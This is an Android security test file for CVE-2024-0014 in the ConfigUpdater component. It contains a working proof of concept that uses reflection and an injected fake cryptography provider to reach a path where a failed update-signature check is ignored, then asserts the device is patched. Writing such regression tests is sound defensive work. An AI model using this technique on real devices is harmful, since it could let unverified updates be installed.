/*
 * Copyright (C) 2025 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2024_0014;

import static androidx.test.core.app.ApplicationProvider.getApplicationContext;

import static com.google.common.truth.Truth.assertWithMessage;
import static com.google.common.truth.TruthJUnit.assume;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.platform.test.annotations.AsbSecurityTest;

import androidx.test.runner.AndroidJUnit4;

import com.android.sts.common.util.StsExtraBusinessLogicTestCase;

import org.junit.Test;
import org.junit.runner.RunWith;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.security.NoSuchAlgorithmException;
import java.security.Provider;
import java.security.Signature;
import java.security.cert.CertificateFactory;
import java.security.cert.CertificateFactorySpi;
import java.util.Arrays;
import java.util.List;

@RunWith(AndroidJUnit4.class)
public class CVE_2024_0014 extends StsExtraBusinessLogicTestCase {

    @SuppressLint("MissingFail")
    @Test
    @AsbSecurityTest(cveBugId = 304082474)
    public void testPocCVE_2024_0014() {
        try {
            // Create context for package 'com.google.android.configupdater'.
            final Context context = getApplicationContext();
            final String configureUpdaterPkgName = getPackageNameForConfigUpdater(context);
            final Context configUpdaterContext =
                    context.createPackageContext(
                            configureUpdaterPkgName,
                            Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE);

            // Load 'CarrierIdUpdateFetcher' and create an instance of it.
            final ClassLoader configUpdaterClassLoader = configUpdaterContext.getClassLoader();
            final Class carrierIdUpdateFetcherClass =
                    configUpdaterClassLoader.loadClass(
                            configureUpdaterPkgName.concat(".CarrierId.CarrierIdUpdateFetcher"));
            final Object updateFetcherClassInstance =
                    carrierIdUpdateFetcherClass
                            .getConstructor(Context.class)
                            .newInstance(configUpdaterContext);

            // Invoke the 'getState()' of 'CarrierIdUpdateFetcher' to fetch the instance of
            // 'StoredState'. Load 'StoredState' class and configure it to reach the
            // vulnerable part.
            final Object storedStateObject =
                    getDeclaredMethod(carrierIdUpdateFetcherClass, "getState")
                            .invoke(updateFetcherClassInstance);
            final Class storedStateClass =
                    configUpdaterClassLoader.loadClass(
                            configureUpdaterPkgName.concat(".StoredState"));
            getDeclaredMethod(storedStateClass, "setAlternativeSignature", String.class)
                    .invoke(storedStateObject, "alt_signature");
            getDeclaredMethod(storedStateClass, "setAlternativeVersionNumber", String.class)
                    .invoke(storedStateObject, "alt_version_number");
            getDeclaredMethod(storedStateClass, "setAlternativeRequiredHash", String.class)
                    .invoke(storedStateObject, "alt_required_hash");

            // Load 'PhenotypeFlag' class and invoke 'init()'.
            final Class phenotypeFlagClass =
                    configUpdaterClassLoader.loadClass(
                            "com.google.android.gms.phenotype.PhenotypeFlag");
            getDeclaredMethod(phenotypeFlagClass, "init", Context.class)
                    .invoke(null, configUpdaterContext);

            // Create an instance of 'ProviderList' and override 'getService()' of 'Provider' to
            // return a configured instance of 'CertificateFactorySpiObject' when 'getService()' is
            // invoked with 'type=CertificateFactory'. Further, it returns a configured instance of
            // 'PocSignatureSpi' when 'type=Signature'.
            final String info = "info";
            final double provider_list = 0;
            final String certificateType = "X.509";
            final Provider pocProvider =
                    new Provider(certificateType, provider_list, info) {
                        @Override
                        public synchronized Service getService(String type, String algorithm) {
                            // Return instance of 'Service' overriding 'newInstance()' to return
                            // created instance of 'PocCertificateFactorySpi' when
                            // 'type=CertificateFactory'.
                            if (type.equals(CertificateFactory.class.getSimpleName())) {
                                final String certificateFactorySpiClassName =
                                        CertificateFactorySpi.class.getName();
                                return new Service(
                                        new Provider(certificateType, provider_list, info) {},
                                        certificateFactorySpiClassName /* type */,
                                        certificateType,
                                        certificateFactorySpiClassName /* className */,
                                        null /* aliases */,
                                        null /* attributes */) {
                                    @Override
                                    public Object newInstance(Object constructorParameter)
                                            throws NoSuchAlgorithmException {
                                        return new PocCertificateFactorySpi();
                                    }
                                };
                            }

                            // Return instance of 'Service' overriding 'newInstance()' to return
                            // an instance of 'PocSignatureSpi' when 'type=Signature'.
                            if (type.equals(Signature.class.getSimpleName())) {
                                return new Service(
                                        new Provider(certificateType, provider_list, info) {},
                                        type,
                                        certificateType,
                                        type,
                                        null /* aliases */,
                                        null /* attributes */) {
                                    @Override
                                    public Object newInstance(Object constructorParameter) {
                                        return new PocSignatureSpi();
                                    }
                                };
                            }
                            return null;
                        }
                    };
            final Object providerListClassObject =
                    getDeclaredMethod(
                                    Class.forName("sun.security.jca.ProviderList"),
                                    "newList",
                                    Provider[].class)
                            .invoke(null, (Object) new Provider[] {pocProvider});

            // Load 'Providers' class, set 'threadListsUsed' and 'threadLists'.
            final Class providerClass = Class.forName("sun.security.jca.Providers");
            getDeclaredField(providerClass, "threadListsUsed").set(null, 1 /* non-zero value */);
            ((ThreadLocal<Object>) getDeclaredField(providerClass, "threadLists").get(null))
                    .set(providerListClassObject);

            // Create a test file to pass as an argument to reproduce the vulnerability.
            final String testFilePath =
                    context.getDataDir().getAbsolutePath().concat("/cve_2024_0014.txt");
            final File testFile = new File(testFilePath);
            testFile.createNewFile();

            // Load 'UpdateFetcher' and invoke the vulnerable method 'startInstall()'.
            final Class updateFetcherClass =
                    configUpdaterClassLoader.loadClass(
                            configureUpdaterPkgName.concat(".UpdateFetcher"));
            try {
                // With fix, a check on return status of 'verifySignature()' is added.
                // Above configuration causes 'verifySignature()' to return 'false' and
                // thus the vulnerable method does not cause any exception.
                getDeclaredMethod(updateFetcherClass, "startInstall", Context.class, String.class)
                        .invoke(updateFetcherClassInstance, configUpdaterContext, testFilePath);
            } catch (InvocationTargetException exception) {
                // Without fix, due to missing check on the return status of
                // 'verifySignature()', an attempt is made to load the passed
                // 'testFilePath' which causes an 'IllegalArgumentException' with
                // message consisting of 'testFilePath'.
                final Throwable cause = exception.getCause();
                assume().withMessage("Unexpected cause for the 'InvocationTargetException'")
                        .that(cause)
                        .isInstanceOf(IllegalArgumentException.class);
                assertWithMessage("Device is vulnerable to b/304082474!!")
                        .that(cause)
                        .hasMessageThat()
                        .doesNotContain(testFile.getName());
            }
        } catch (Exception e) {
            assume().that(e).isNull();
        }
    }

    public String getPackageNameForConfigUpdater(Context context) {
        // Resolve the receiver for 'android.intent.action.BOOT_COMPLETED'.
        final List<ResolveInfo> resolveInfos =
                context.getPackageManager()
                        .queryBroadcastReceivers(
                                new Intent(Intent.ACTION_BOOT_COMPLETED), PackageManager.MATCH_ALL);

        // Return the package name of ConfigUpdater.
        for (ResolveInfo resolveInfo : resolveInfos) {
            if (resolveInfo.activityInfo != null
                    && resolveInfo.activityInfo.packageName.contains(".configupdater")) {
                return resolveInfo.activityInfo.packageName;
            }
        }

        // Return "com.google.android.configupdater", if package name is not found.
        return "com.google.android.configupdater";
    }

    public final Field getDeclaredField(Class cls, String filedName) {
        for (Field declaredField : cls.getDeclaredFields()) {
            if (declaredField.getName().contains(filedName)) {
                declaredField.setAccessible(true);
                return declaredField;
            }
        }
        throw new IllegalStateException(
                String.format("No field found with name: %s in %s", filedName, cls));
    }

    private Method getDeclaredMethod(Class cls, String methodName, Class... args) {
        for (Method declaredMethod : cls.getDeclaredMethods()) {
            if (declaredMethod.getName().contains(methodName)
                    && Arrays.equals(declaredMethod.getParameterTypes(), args)) {
                declaredMethod.setAccessible(true);
                return declaredMethod;
            }
        }
        throw new IllegalStateException(
                String.format("No method found with name %s in %s", methodName, cls));
    }
}
